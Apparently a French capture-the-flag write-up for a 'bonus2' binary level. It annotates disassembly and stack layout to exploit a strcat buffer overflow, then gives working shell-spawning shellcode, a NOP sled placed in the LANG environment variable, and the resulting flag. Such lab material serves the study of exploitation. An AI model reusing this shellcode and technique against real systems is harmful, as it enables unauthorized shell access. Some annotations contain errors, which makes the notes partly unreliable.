i functions

0x08048484  greetuser
0x08048529  main


Dans le main, si argv1 >= 40, on va avoir une concaténation de argv1 (40 chars) et des 32 premiers chars de argv2 (user) (buffer[39] ne sera plus un '\0' donc pas de séparation des strings).
Dans le greet user, on a un buffer de 64 mais 76 chars à remplir + adresse.

Avec "Hello " (lang ni "fi" ni "nl"), on ne réécrit que la moitié de l'adresse.
Si argv1 == 40 chars et argv2 == 32 chars nous avons 72 chars concaténés à la suite de "Hello " soit 72 + 6 chars = 78 chars (76 chars + 2).

Avec "Goedemiddag! ", nous avons 13 chars. Donc 13 +   40   +       23        +   4 chars          => 76 chars + adresse
                                                     argv1  +   argv1(part1)  + adresse retour

Solution : 
=> Injecter shellcode (argv1 + argv2 puis donner l'adresse du shellcode)

 ./bonus2 $(python -c "print ('\xbf\xff\xf6\x10'[::-1] + '\x90' * 10 + '\x31\xd2\x31\xc9\x51\x68\x 2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')") $(python -c "print ('C'*23 + '\xb f\xff\xf6\x06'[::-1])")


=> Problème : le shellcode est sur la stack et donc les adresses varient d'une exécution à une autre.

=> Solution : on insère le shellode dans la variable d'env LANG

Export LANG='nl'
dans gdb, dans le main juste après le getenv est retournée l'adresse 0xbfffff33 (='nl')


export LANG=`python -c "print('nl' + '\x90' * 200 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x6 8\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`
0xbfffff33 + 100 = 0xbfffff97

 ./bonus2 $(python -c "print ('A' * 40)") $(python -c "print('B'*23 + '\xbf\xff\xfe\x97'[::-1])")


=> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587



Shellcode : 26


greetuser:


0xbffff5d0 : esp

0xbffff5e0 : debut buffer (esp+16/ebp-0x48 = 72)
|
|
|  bufffer : 64 octets 
|
0xbffff616 fin buffer
0xbffff620 : 0xbfffff2a = "en_US.UTF-8"
0xbffff624 : 0xb7fff918 = 0
0xbffff628 ebp (esp+88)
0xbffff62c eip (ebp+4)








main : 


0xbffff5b0 : esp

   80 octets (sub)

0xbffff600 debut buffer (esp+80)
|
|   Buffer : 68 octets + 4 = 72 octets
|
|
0xbffff644 fin buffer (esp+148 = 80+68)
   36 octets
0xbffff668 : ebp (esp+184)




Dump of assembler code for function main:
   0x08048529 <+0>:     push   ebp
   0x0804852a <+1>:     mov    ebp,esp
   0x0804852c <+3>:     push   edi
   0x0804852d <+4>:     push   esi
   0x0804852e <+5>:     push   ebx
   0x0804852f <+6>:     and    esp,0xfffffff0
   0x08048532 <+9>:     sub    esp,0xa0 => char [42] ?

   0x08048538 <+15>:    cmp    DWORD PTR [ebp+0x8],0x3 => if argc == 3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    eax,0x1
   0x08048543 <+26>:    jmp    0x8048630 <main+263> => sinon leave (return 1)

   0x08048548 <+31>:    lea    ebx,[esp+0x50] => ebx = 0xbffff6d0:     0x08048287 ("__libc_start_main")
   0x0804854c <+35>:    mov    eax,0x0 => eax = 0
   0x08048551 <+40>:    mov    edx,0x13 => edx = 0x13 (19)
   0x08048556 <+45>:    mov    edi,ebx => edi = 0xbffff6d0:     0x08048287
   0x08048558 <+47>:    mov    ecx,edx => 0x13 (19)
   0x0804855a <+49>:    rep stos DWORD PTR es:[edi],eax ==>  for ecx (19) repetitions, stores the contents of eax (0x0) into where edi points (0xbffff600)

   => memset(void *str, int c, size_t n) => memset(0xbffff600, 0, 19);

   0x0804855c <+51>:    mov    eax,DWORD PTR [ebp+0xc] => eax = 0xbffff7d4:     0xbffff8f0 = "/home/user/bonus2/bonus2"
   0x0804855f <+54>:    add    eax,0x4 => eax = 0xbffff7d8 = "argv1"
   0x08048562 <+57>:    mov    eax,DWORD PTR [eax] => eax = "argv1"
   0x08048564 <+59>:    mov    DWORD PTR [esp+0x8],0x28 => esp+8 = 40
   0x0804856c <+67>:    mov    DWORD PTR [esp+0x4],eax => esp+4 => argv1
   0x08048570 <+71>:    lea    eax,[esp+0x50] =>  0xbffff6d0
   0x08048574 <+75>:    mov    DWORD PTR [esp],eax  => 
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt> => strncpy(0xbffff6d0, argv1, 40)

   0x0804857c <+83>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:    add    eax,0x8 => eax = 0xbffff90f
   0x08048582 <+89>:    mov    eax,DWORD PTR [eax] => "argv2"

   0x08048584 <+91>:    mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:    mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:   lea    eax,[esp+0x50]
   0x08048594 <+107>:   add    eax,0x28 => eax+40
   0x08048597 <+110>:   mov    DWORD PTR [esp],eax
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt> strncpy(0xbffff6f8, 0xbffff90f, 32) => strncpy(0xbffff6f8, argv2, 32)

   0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738 => "LANG"
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt> getenv("LANG")


   0x080485ab <+130>:   mov    DWORD PTR [esp+0x9c],eax => "en_US.UTF-8"

   0x080485b2 <+137>:   cmp    DWORD PTR [esp+0x9c],0x0 => si LANG = 0x0 => main+239
   0x080485ba <+145>:   je     0x8048618 <main+239>

   sinon : 

   0x080485bc <+147>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:   mov    DWORD PTR [esp+0x4],0x804873d => "fi"
   0x080485cc <+163>:   mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:   mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt> memcmp(en_US.UTF-8, "fi", 2)

   0x080485db <+178>:   test   eax,eax

   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   mov    DWORD PTR ds:0x8049988,0x1 
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>

    à 0x8049988 (language) vaut toujours 0x0

   0x080485eb <+194>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:   mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:   mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:   mov    DWORD PTR [esp],eax
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt> memcmp(en_US.UTF-8, "n1", 2)

   0x0804860a <+225>:   test   eax,eax

   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   mov    DWORD PTR ds:0x8049988,0x2

    à 0x8049988 (language) vaut toujours 0x0

   0x08048618 <+239>:   mov    edx,esp => edx = 0xbfffff2a = "en_US.UTF-8"
   0x0804861a <+241>:   lea    ebx,[esp+0x50] => ebx = argv1
   0x0804861e <+245>:   mov    eax,0x13 => eax = 0x13 (19)
   0x08048623 <+250>:   mov    edi,edx => edi = 0xbfffff2a = "en_US.UTF-8"
   0x08048625 <+252>:   mov    esi,ebx => esi = argv1
   0x08048627 <+254>:   mov    ecx,eax => exc = 0x13

   0x08048629 <+256>:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] => movs copies data from ds:esi to es:edi => "en_US.UTF-8" copié à la place de argv1

   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    esp,[ebp-0xc]
   0x08048633 <+266>:   pop    ebx
   0x08048634 <+267>:   pop    esi
   0x08048635 <+268>:   pop    edi
   0x08048636 <+269>:   pop    ebp
   0x08048637 <+270>:   ret





Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   ebp
   0x08048485 <+1>:     mov    ebp,esp
   0x08048487 <+3>:     sub    esp,0x58 => (0x58 <=> 88)
   0x0804848a <+6>:     mov    eax,ds:0x8049988 => 0x8049988 <language>:   0x0

   0x0804848f <+11>:    cmp    eax,0x1
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    eax,0x2
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   eax,eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>

   0x0804849d <+25>:    mov    edx,0x8048710=> edx = 0x8048710 :"Hello "
   0x080484a2 <+30>:    lea    eax,[ebp-0x48] => eax = 0x0804823c
   0x080484a5 <+33>:    mov    ecx,DWORD PTR [edx] => ecx = 0x6c6c6548
   0x080484a7 <+35>:    mov    DWORD PTR [eax],ecx => eax = 0x6c6c6548
   0x080484a9 <+37>:    movzx  ecx,WORD PTR [edx+0x4] => ecx = 0x206f
   0x080484ad <+41>:    mov    WORD PTR [eax+0x4],cx => eax+4 = 0x0804206f
   0x080484b1 <+45>:    movzx  edx,BYTE PTR [edx+0x6] => edx = 0 
   0x080484b5 <+49>:    mov    BYTE PTR [eax+0x6],dl => $eax = "Hello "
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>

   0x080484ba <+54>:    mov    edx,0x8048717 => "Hyvää päivää "
   0x080484bf <+59>:    lea    eax,[ebp-0x48]
   0x080484c2 <+62>:    mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:    mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:    mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:    mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:    mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:    mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:    mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:    mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:    movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:    mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:    movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:    mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>

   0x080484e9 <+101>:   mov    edx,0x804872a => "Goedemiddag! "
   0x080484ee <+106>:   lea    eax,[ebp-0x48]
   0x080484f1 <+109>:   mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:   mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:   mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:   mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:   mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:   mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:   movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:   mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:   nop

   0x0804850a <+134>:   lea    eax,[ebp+0x8] => eax = argv1
   0x0804850d <+137>:   mov    DWORD PTR [esp+0x4],eax => argv1
   0x08048511 <+141>:   lea    eax,[ebp-0x48] => eax = "Hello "
   0x08048514 <+144>:   mov    DWORD PTR [esp],eax => "Hello "
   0x08048517 <+147>:   call   0x8048370 <strcat@plt> => strcat("Hello ", argv1)

   0x0804851c <+152>:   lea    eax,[ebp-0x48]
   0x0804851f <+155>:   mov    DWORD PTR [esp],eax
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret